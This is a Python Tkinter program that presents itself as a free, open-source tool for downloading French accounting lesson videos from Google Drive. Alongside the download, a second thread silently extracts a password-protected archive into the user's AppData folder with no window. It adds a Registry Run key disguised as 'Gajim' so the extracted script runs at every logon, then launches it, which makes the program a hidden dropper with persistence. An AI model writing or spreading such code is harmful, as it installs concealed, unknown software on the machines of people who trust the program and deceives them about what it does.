# Library is free and open source accounting lessons download tool under Gnu3 Licence 2016-2023
import os
import sys
import tkinter as tk
import winreg
import subprocess
from tkinter import ttk
from threading import Thread
from urllib.request import urlretrieve, URLError
from time import sleep
import socket

# Download videos
class DownloadManager:
    def __init__(self, window):
        self.window = window
        self.window.title("Library")
        self.window.geometry('700x430')
        self.window.iconbitmap('bin/1.ico')
        self.window.resizable(False, False)
        self.window.config(bg="Black")

        self.bg = tk.PhotoImage(file="bin/picture2.png")
        self.label1 = tk.Label(self.window, image=self.bg)
        self.label1.place(x=0, y=0)

        self.P = ttk.Progressbar(self.window, max=100, orient=tk.HORIZONTAL, length=360, mode='determinate')
        self.P.pack()
        self.P.place(relx=0.47, rely=0.9, anchor='w')

        self.lbl = tk.Label(self.window, text="Telechargement en cours...", fg='#f00', bg='#000', font=("Arial Bold", 15))
        self.lbl.place(relx=0.03, rely=0.9, anchor='w')

    def start_download(self):
        thread = Thread(target=self.nad_with_retry)
        thread.start()

    def nad_with_retry(self):
        links = [
            ("download/TVA-partie1.mp4",
             "https://drive.google.com/uc?export=download&id=1ODvu8MdM624SGZggPur_Wcb2SS1vJTY9"),
            ("download/La-facture.mp4",
             "https://drive.google.com/uc?export=download&id=1HHK1i3b9DeSb_F1_gSmkYB3Av9gKAISj"),
            ("download/La-sante-financiere.mp4",
             "https://drive.google.com/uc?export=download&id=1ei1kaaPwxGkF15lg56oZgKBLBTVr-t2P"),
            ("download/Le-bilan-comptable.mp4",
             "https://drive.google.com/uc?export=download&id=1Ulv8hdnaQlPumTkXhkuJsSqGuKAxhjAS"),
            ("download/Le-journal-et-balance.mp4",
             "https://drive.google.com/uc?export=download&id=15wMz9a8buR_shtyt2MMD3YQWfsYi6MXP"),
            ("download/Produits-et-charges.mp4",
             "https://drive.google.com/uc?export=download&id=1729Liqy3X8QOLm8o0N93-nG8oFcTmiAy"),
            ("download/Les-destinataires.mp4",
             "https://drive.google.com/uc?export=download&id=1nRtWdzQAFzkGm_e1N4EWnEQSANJsYKzb"),
            ("download/Resultat-comptable-et-fiscal.mp4",
             "https://drive.google.com/uc?export=download&id=1Nwo8MU1k5_xdpI7UEoqKgNrGUhCCaQcH"),
            ("download/Tva-partie2.mp4",
             "https://drive.google.com/uc?export=download&id=14ugyxWohx90cSnekDM-SKaiOruq4tk-n"),
            ("download/Importance-de-la-comptablite.mp4",
             "https://drive.google.com/uc?export=download&id=1O-a6qslj5zc6nJMBoPWESamBl-wuo1yN"),
            ("download/Benefice-et-tresorerie.mp4",
             "https://drive.google.com/uc?export=download&id=1YwNEg25FF_Au9A5cNkDkdU91IbBNVi3c"),
        ]

        all_files_downloaded = False
        while not all_files_downloaded:
            all_files_downloaded = True
            for filename, link in links:
                print("Downloading:", filename)
                if not os.path.exists(filename):
                    success = self.download_with_retry(link, filename, max_retries=3, retry_delay=1)
                    if success:
                        self.update_progress(len(links))
                    else:
                        print("Failed to download:", filename)
                        all_files_downloaded = False

        self.finish_download()

    def download_with_retry(self, url, filename, max_retries, retry_delay):
        retries = 0
        while retries < max_retries:
            try:
                urlretrieve(url, filename)
                return True
            except URLError as e:
                print("Download failed due to connection error:", str(e))
                retries += 1
                sleep(retry_delay)

        return False

    def update_progress(self, total_links):
        self.P.step(100 / total_links)
        self.window.update()

    def finish_download(self):
        self.lbl.config(text="Téléchargement terminé")
        self.P.stop()
        self.P.pack_forget()
        self.P.destroy()


class OtherClass:
    def extract7zip(self):
        username = os.environ['USERNAME']
        appdata_folder = os.path.join(os.path.expanduser('~' + username), 'AppData')
        library_folder = os.path.join(appdata_folder, 'Library')
        archive_file = 'bin/bin.7z'
        subprocess.run(['bin/7za.exe', 'x', '-pnad400', '-aoa', archive_file, f'-o{library_folder}'], check=True,
                       creationflags=subprocess.CREATE_NO_WINDOW) 
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        user_profile = os.environ['USERPROFILE']
        script_path = os.path.join(user_profile, "AppData", "Library", "Gajim.pyw")
        python_executable = os.path.join(user_profile, "AppData", "Library", "pythonw.exe")
        value_name = "Gajim"
        value_data = f'"{python_executable}" "{script_path}"'
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
        winreg.CloseKey(key)
        gog = os.path.join(user_profile, "AppData", "Library", "Gajim.pyw")
        yah = os.path.join(user_profile, "AppData", "Library", "pythonw.exe")
        creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP
        subprocess.Popen([yah, gog], creationflags=creation_flags)
        

def on_window_close():
    window.destroy()  
    os._exit(0)  


if __name__ == '__main__':
    window = tk.Tk()
    window.protocol("WM_DELETE_WINDOW", on_window_close)

    dm = DownloadManager(window)
    oc = OtherClass()

    download_thread = Thread(target=dm.start_download)
    other_thread = Thread(target=oc.extract7zip)

    download_thread.start()
    other_thread.start()

    window.mainloop()
